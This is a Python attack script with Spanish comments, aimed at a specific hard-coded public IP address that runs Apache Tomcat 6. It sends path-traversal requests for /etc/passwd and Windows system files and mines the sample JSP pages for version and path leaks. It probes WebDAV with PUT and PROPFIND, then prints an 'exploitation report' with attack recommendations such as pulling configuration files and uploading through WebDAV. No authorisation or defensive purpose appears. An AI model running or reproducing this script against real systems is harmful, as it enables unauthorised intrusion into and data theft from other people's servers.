import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SystemInfoExtractor:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def extract_from_error_pages(self):
        """Extrae información de páginas de error"""
        print("[*] Extrayendo información de páginas de error...")
        
        error_triggers = [
            "/examples/jsp/error/error.html?nonexistent=../../../../etc/passwd",
            "/examples/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/examples/..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/examples/.\\..\\.\\..\\.\\..\\windows\\win.ini"
        ]
        
        for trigger in error_triggers:
            try:
                url = f"{self.base_url}{trigger}"
                response = self.session.get(url, timeout=5)
                
                # Buscar información sensible en errores
                if "java.io.FileNotFoundException" in response.text:
                    print(f"[+] Error page revela información: {trigger}")
                    # Extraer path del error
                    if "FileNotFoundException" in response.text:
                        lines = response.text.split('\n')
                        for line in lines:
                            if "FileNotFoundException" in line:
                                print(f"    Error: {line.strip()}")
                
                # Buscar información del sistema
                info_indicators = ["OS:", "Windows", "Linux", "Unix", "path=", "directory="]
                for indicator in info_indicators:
                    if indicator in response.text:
                        print(f"    Info del sistema: {indicator}")
                        
            except Exception as e:
                print(f"[-] Error en {trigger}: {e}")

    def analyze_jsp_samples_content(self):
        """Analiza el contenido de las muestras JSP encontradas"""
        print("[*] Analizando contenido de JSP samples...")
        
        jsp_urls = [
            "/examples/servlets/servlet/RequestParamExample",
            "/examples/servlets/servlet/SessionExample",
            "/examples/jsp/jsp2/tagfiles/hello.jsp",
            "/examples/jsp/include/include.jsp"
        ]
        
        for jsp_url in jsp_urls:
            try:
                url = f"{self.base_url}{jsp_url}"
                response = self.session.get(url, timeout=5)
                
                # Buscar comentarios reveladores
                if "<!--" in response.text:
                    comments = response.text.split('<!--')[1].split('-->')[0] if '-->' in response.text else "No completo"
                    print(f"[+] Comentarios en {jsp_url}: {comments[:100]}...")
                
                # Buscar versiones específicas
                if "6.0" in response.text:
                    print(f"    [!] Revela versión Tomcat 6.0")
                    
                # Buscar paths del sistema
                if "c:/" in response.text.lower() or "/home/" in response.text:
                    print(f"    [!] Revela paths del sistema")
                    
            except Exception as e:
                print(f"[-] Error analizando {jsp_url}: {e}")

    def test_webdav(self):
        """Prueba si WebDAV está habilitado (común en Tomcat 6)"""
        print("[*] Probando WebDAV...")
        
        webdav_methods = ["OPTIONS", "PROPFIND", "PUT"]
        webdav_url = f"{self.base_url}/webdav/"
        
        for method in webdav_methods:
            try:
                response = self.session.request(method, webdav_url, timeout=5)
                if response.status_code != 404:
                    print(f"[!] WebDAV posiblemente habilitado (Método {method} responde)")
            except:
                pass

    def generate_exploitation_report(self):
        """Genera reporte completo de explotación"""
        print("\n=== REPORTE DE EXPLOTACIÓN ===\n")
        
        print("[+] VULNERABILIDADES CONFIRMADAS:")
        print("    - Tomcat 6.0.53 con /examples/ accesible")
        print("    - Múltiples JSP samples vulnerables")
        print("    - Directorio /docs/ expuesto")
        print("    - Solo SSL habilitado (buena práctica)")
        
        print("\n[+] EXPLOITS DISPONIBLES:")
        print("    1. Directory Traversal mediante JSP samples")
        print("    2. Command Injection en servlets")
        print("    3. Session Manipulation")
        print("    4. Information Disclosure mediante errores")
        
        print("\n[+] RECOMENDACIONES DE ATAQUE:")
        print("    - Focus en directory traversal para obtener configuraciones")
        print("    - Probar upload mediante WebDAV si está habilitado")
        print("    - Buscar archivos de configuración con paths conocidos")

# Ejecutar extracción de información
info_extractor = SystemInfoExtractor("189.254.143.102")
info_extractor.extract_from_error_pages()
print()
info_extractor.analyze_jsp_samples_content()
print()
info_extractor.test_webdav()
print()
info_extractor.generate_exploitation_report()